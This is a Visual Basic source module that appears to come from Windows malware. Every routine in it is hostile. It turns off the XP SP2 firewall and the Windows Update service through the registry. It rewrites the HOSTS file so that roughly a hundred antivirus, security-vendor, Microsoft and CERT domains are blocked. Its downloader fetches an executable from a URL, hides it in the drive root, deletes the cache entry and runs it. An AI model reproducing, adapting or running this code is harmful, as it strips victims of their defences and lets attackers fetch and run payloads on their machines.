Attribute VB_Name = "Functions"
' Downloader function declarations
Public Const INTERNET_OPEN_TYPE_DIRECT = 1
Public Const INTERNET_OPEN_TYPE_PROXY = 3
Public Const INTERNET_FLAG_RELOAD = &H80000000

Public Declare Function InternetOpen Lib "wininet" Alias "InternetOpenA" (ByVal sAgent As String, ByVal lAccessType As Long, ByVal sProxyName As String, ByVal sProxyBypass As String, ByVal lFlags As Long) As Long
Public Declare Function InternetCloseHandle Lib "wininet" (ByRef hInet As Long) As Long
Public Declare Function InternetReadFile Lib "wininet" (ByVal hFile As Long, ByVal sBuffer As String, ByVal lNumBytesToRead As Long, lNumberOfBytesRead As Long) As Integer
Public Declare Function InternetOpenUrl Lib "wininet" Alias "InternetOpenUrlA" (ByVal hInternetSession As Long, ByVal lpszUrl As String, ByVal lpszHeaders As String, ByVal dwHeadersLength As Long, ByVal dwFlags As Long, ByVal dwContext As Long) As Long
Public Declare Function DeleteUrlCacheEntry Lib "wininet.dll" Alias "DeleteUrlCacheEntryA" (ByVal lpszUrlName As String) As Long
Public Declare Function URLDownloadToFile Lib "urlmon" Alias "URLDownloadToFileA" (ByVal pCaller As Long, ByVal szURL As String, ByVal szFileName As String, ByVal dwReserved As Long, ByVal lpfnCB As Long) As Long
Public Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)

' functions! (downloader code below)

Public Sub BlockSP2()
' XP SP2 Firewall // 4 = disabled!
SetDWORDValue "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess", "Start", 4
' Windows Update
SetDWORDValue "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\wuauserv", "Start", 4
End Sub

Public Sub ModifyHostsFile()
On Error Resume Next
Dim winHostsFile As String
winHostsFile = LeftStr(CStr(App.path), 3) & "WINDOWS\System32\Drivers\etc\HOSTS"
WriteHostEntries winHostsFile
winHostsFile = LeftStr(CStr(App.path), 3) & "WINDOWS\HOSTS"
WriteHostEntries winHostsFile
End Sub

Sub WriteHostEntries(ByVal path As String)
On Error Resume Next
If InStr(path, ":") = 0 Or Len(path) < 3 Then Exit Sub
Dim xfile As Long
xfile = FreeFile()
Open path For Output As #xfile
    ' lets block some websites!
    Print #xfile, ROutput("127.0.2.5\twww.symantec.com\r\n")
    Print #xfile, ROutput("127.0.2.5\tsymantec.com\r\n")
    Print #xfile, ROutput("127.0.2.5\tsecurityresponse.symantec.com\r\n")
    Print #xfile, ROutput("127.0.2.5\tsarc.com\r\n")
    Print #xfile, ROutput("127.0.2.5\twww.sarc.com\r\n")
    Print #xfile, ROutput("127.0.2.5\twww.sophos.com\r\n")
    Print #xfile, ROutput("127.0.2.5\tsophos.com\r\n")
    Print #xfile, ROutput("127.0.2.5\twww.mcafee.com\r\n")
    Print #xfile, ROutput("127.0.2.5\tmcafee.com\r\n")
    Print #xfile, ROutput("127.0.2.5\tliveupdate.symantecliveupdate.com\r\n")
    Print #xfile, ROutput("127.0.2.5\twww.viruslist.com\r\n")
    Print #xfile, ROutput("127.0.2.5\tviruslist.com\r\n")
    Print #xfile, ROutput("127.0.2.5\tf-secure.com\r\n")
    Print #xfile, ROutput("127.0.2.5\twww.f-secure.com\r\n")
    Print #xfile, ROutput("127.0.2.5\tf-prot.com\r\n")
    Print #xfile, ROutput("127.0.2.5\twww.f-prot.com\r\n")
    Print #xfile, ROutput("127.0.2.5\tkaspersky.com\r\n")
    Print #xfile, ROutput("127.0.2.5\tkaspersky-labs.com\r\n")
    Print #xfile, ROutput("127.0.2.5\twww.avp.com\r\n")
    Print #xfile, ROutput("127.0.2.5\tavp.com\r\n")
    Print #xfile, ROutput("127.0.2.5\twww.kaspersky.com\r\n")
    Print #xfile, ROutput("127.0.2.5\twww.networkassociates.com\r\n")
    Print #xfile, ROutput("127.0.2.5\tnetworkassociates.com\r\n")
    Print #xfile, ROutput("127.0.2.5\twww.ca.com\r\n")
    Print #xfile, ROutput("127.0.2.5\tca.com\r\n")
    Print #xfile, ROutput("127.0.2.5\tmast.mcafee.com\r\n")
    Print #xfile, ROutput("127.0.2.5\tmy-etrust.com\r\n")
    Print #xfile, ROutput("127.0.2.5\twww.my-etrust.com\r\n")
    Print #xfile, ROutput("127.0.2.5\tdownload.mcafee.com\r\n")
    Print #xfile, ROutput("127.0.2.5\tdispatch.mcafee.com\r\n")
    Print #xfile, ROutput("127.0.2.5\tsecure.nai.com\r\n")
    Print #xfile, ROutput("127.0.2.5\tnai.com\r\n")
    Print #xfile, ROutput("127.0.2.5\twww.nai.com\r\n")
    Print #xfile, ROutput("127.0.2.5\tvil.nai.com\r\n")
    Print #xfile, ROutput("127.0.2.5\tupdate.symantec.com\r\n")
    Print #xfile, ROutput("127.0.2.5\tupdates.symantec.com\r\n")
    Print #xfile, ROutput("127.0.2.5\tus.mcafee.com\r\n")
    Print #xfile, ROutput("127.0.2.5\tliveupdate.symantec.com\r\n")
    Print #xfile, ROutput("127.0.2.5\tcustomer.symantec.com\r\n")
    Print #xfile, ROutput("127.0.2.5\trads.mcafee.com\r\n")
    Print #xfile, ROutput("127.0.2.5\ttrendmicro.com\r\n")
    Print #xfile, ROutput("127.0.2.5\twww.trendmicro.com\r\n")
    Print #xfile, ROutput("127.0.2.5\thousecall.trendmicro.com\r\n")
    Print #xfile, ROutput("127.0.2.5\tpandasoftware.com\r\n")
    Print #xfile, ROutput("127.0.2.5\twww.pandasoftware.com\r\n")
    Print #xfile, ROutput("127.0.2.5\twww.trendmicro.com\r\n")
    Print #xfile, ROutput("127.0.2.5\tfree.grisoft.com\r\n")
    Print #xfile, ROutput("127.0.2.5\twww.grisoft.com\r\n")
    Print #xfile, ROutput("127.0.2.5\tgrisoft.com\r\n")
    Print #xfile, ROutput("127.0.2.5\tclamav.net\r\n")
    Print #xfile, ROutput("127.0.2.5\twww.clamav.net\r\n")
    Print #xfile, ROutput("127.0.2.5\tfree-av.com\r\n")
    Print #xfile, ROutput("127.0.2.5\twww.free-av.com\r\n")
    Print #xfile, ROutput("127.0.2.5\twww.avast.com\r\n")
    Print #xfile, ROutput("127.0.2.5\tavast.com\r\n")
    Print #xfile, ROutput("127.0.2.5\tcert.org\r\n")
    Print #xfile, ROutput("127.0.2.5\twww.cert.org\r\n")
    Print #xfile, ROutput("127.0.2.5\twww.microsoft.com\r\n")
    Print #xfile, ROutput("127.0.2.5\tmicrosoft.com\r\n")
    Print #xfile, ROutput("127.0.2.5\twww.virustotal.com\r\n")
    Print #xfile, ROutput("127.0.2.5\tvirustotal.com\r\n")
    Print #xfile, ROutput("127.0.2.5\tupdate.microsoft.com\r\n")
    Print #xfile, ROutput("127.0.2.5\twindowsupdate.microsoft.com\r\n")
    Print #xfile, ROutput("127.0.2.5\twww.avira.com\r\n")
    Print #xfile, ROutput("127.0.2.5\tavira.com\r\n")
    Print #xfile, ROutput("127.0.2.5\tantivir.de\r\n")
    Print #xfile, ROutput("127.0.2.5\twww.antivir.de\r\n")
    Print #xfile, ROutput("127.0.2.5\twww.lidl.de\r\n")
    Print #xfile, ROutput("127.0.2.5\twww.prevx.com/\r\n")
    Print #xfile, ROutput("127.0.2.5\tprevx.com/\r\n")
    Print #xfile, ROutput("127.0.2.5\tchip.de/\r\n")
    Print #xfile, ROutput("127.0.2.5\twww.chip.de/\r\n")
    Print #xfile, ROutput("127.0.2.5\twww.norton-security-store.com/\r\n")
    Print #xfile, ROutput("127.0.2.5\tnorton-security-store.com/\r\n")
    Print #xfile, ROutput("127.0.2.5\tshop.symantecstore.com/\r\n")
    Print #xfile, ROutput("127.0.2.5\twww.shop.symantecstore.com/\r\n")
    Print #xfile, ROutput("127.0.2.5\twww.zonealarm.se/\r\n")
    Print #xfile, ROutput("127.0.2.5\tzonealarm.se/\r\n")
    Print #xfile, ROutput("127.0.2.5\tzonealarm.com/\r\n")
    Print #xfile, ROutput("127.0.2.5\twww.zonealarm.com/\r\n")
    Print #xfile, ROutput("127.0.2.5\tzonealarm.de\r\n")
    Print #xfile, ROutput("127.0.2.5\twww.zonealarm.de/\r\n")
    Print #xfile, ROutput("127.0.2.5\tvirusprotection.se/\r\n")
    Print #xfile, ROutput("127.0.2.5\twww.virusprotection.se/\r\n")
    Print #xfile, ROutput("127.0.2.5\twww.norton-online.com/\r\n")
    Print #xfile, ROutput("127.0.2.5\tnorton-online.com/\r\n")
    Print #xfile, ROutput("127.0.2.5\twww.antivirus-herunterladen.info/\r\n")
    Print #xfile, ROutput("127.0.2.5\tantivirus-herunterladen.info/\r\n")
    Print #xfile, ROutput("127.0.2.5\twww.mcafeestore.com/\r\n")
    Print #xfile, ROutput("127.0.2.5\tmcafeestore.com/\r\n")
    Print #xfile, ROutput("127.0.2.5\twww.free-av.de/\r\n")
    Print #xfile, ROutput("127.0.2.5\tfree-av.de/\r\n")
    Print #xfile, ROutput("127.0.2.5\twww.avast.de/\r\n")
    Print #xfile, ROutput("127.0.2.5\tavast.de/\r\n")
    Print #xfile, ROutput("127.0.2.5\twww.grisoft.de/\r\n")
    Print #xfile, ROutput("127.0.2.5\tgrisoft.de/\r\n")
    Print #xfile, ROutput("127.0.2.5\twww.panda-software.de/\r\n")
    Print #xfile, ROutput("127.0.2.5\tpanda-software.de/\r\n")
    Print #xfile, ROutput("127.0.2.5\twww.bitdefender.de/\r\n")
    Print #xfile, ROutput("127.0.2.5\tbitdefender.de/\r\n")
    Print #xfile, ROutput("127.0.2.5\twww.bitdefender.com/\r\n")
    Print #xfile, ROutput("127.0.2.5\tbitdefender.com/\r\n")
Close #xfile
End Sub

Public Function LeftStr(ByVal str As String, size As Long) As String
'Messenger references interfere with the Left function - so we have our own!
On Error Resume Next
If size <= 0 Then
    LeftStr = str
    Exit Function
End If
LeftStr = Mid$(str, 1, size)
End Function

Public Function ROutput(ByVal str As String) As String
Dim outp As String
outp = str
outp = Replace$(Replace$(Replace$(str, "\r\n", vbLf), "\r", vbCr), "\t", Chr$(9))
outp = Replace$(outp, "\0", Chr$(0))
ROutput = outp
End Function

Public Function DownloadFile(ByVal url As String, exec As Boolean) As Boolean
On Error Resume Next
' NOTE:
' Since I can't get InternetReadFile and those APIs working correctly in VB, i'll
' just use URLDownloadToFile for now (even though it locks up vb until it finishes :( )

Dim hOpen As Long, hFile As Long, sBuffer As String, ret As Long, fpath As String, f As Long
'sBuffer = Space$(1000)
'hOpen = InternetOpen("MSIE 6.0", INTERNET_OPEN_TYPE_DIRECT, vbNullString, vbNullString, 0)
'hFile = InternetOpenUrl(hOpen, url, vbNullString, ByVal 0&, INTERNET_FLAG_RELOAD, ByVal 0&)
'If hOpen = 0 Or hFile = 0 Then DownloadFile = False: Exit Function
Dim i As Integer
Dim ccount As Integer
fpath = LeftStr(App.path, 3) & "f" & CStr(CLng(Rnd() * 239120)) & ".exe"
If Len(fpath) < 3 Then
    fpath = "c:\fjasss" & CStr(CLng(Rnd() * 222)) & ".exe" ' last resort
End If
'f = FreeFile()
'Open fpath For Binary Access Write As #f
'While ret <> 0
'    Dim ret2 As Integer
    'ret2 = InternetReadFile(hFile, sBuffer, 1000, ret)
'    If ret2 = 0 Then
'        GoTo ggetout ' done?
'    End If
'    Put #f, , sBuffer ' write to file
'    ccount = ccount + 1
'    If ccount > 99999 Then
'        GoTo ggetout ' 99999 iterations at 1,000 bytes per loop is way to much...
'    End If
'    DoEvents
'Wend
'ggetout:
'Close #f
Call URLDownloadToFile(0, url, fpath, 0, 0) ' once this finishes, execution will continue
If FileExists(fpath) = False Then
    DownloadFile = False
    Exit Function
End If
SetAttr fpath, vbHidden ' hide it ;)
'InternetCloseHandle hFile
'InternetCloseHandle hOpen
DeleteUrlCacheEntry url ' no caches! Incase we need to re-download (new file posted, etc)
If exec = True And Len(fpath) Then
    Shell fpath, vbNormalFocus
End If
DownloadFile = True
End Function

Public Function FileExists(FullFileName As String) As Boolean
    On Error GoTo MakeF
        Open FullFileName For Input As #1
        Close #1
        FileExists = True
    Exit Function
MakeF:
        FileExists = False
    Exit Function
End Function

